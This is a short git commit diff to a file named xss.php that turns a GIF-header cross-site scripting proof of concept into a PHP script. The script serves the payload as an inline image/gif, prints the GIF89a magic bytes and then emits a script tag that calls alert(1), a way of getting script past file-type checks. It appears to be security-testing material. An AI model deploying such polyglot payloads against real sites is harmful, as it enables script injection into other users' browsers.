c93b5f748568b1b53e410d7cc888f1fb8f67d65e
acornsgrow <58203605+anony2001@users.noreply.github.com>
2026-01-30 17:10:33 +0530

    Update xss.php

--- xss.php
+++ xss.php
@@ -1,2 +1,6 @@
-GIF89a
-<script>alert(1)</script>
+<?php
+header('Content-Type: image/gif');
+header('Content-Disposition: inline'); // Remove attachment
+echo "GIF89a";
+echo '<script>alert(1)</script>';
+?>
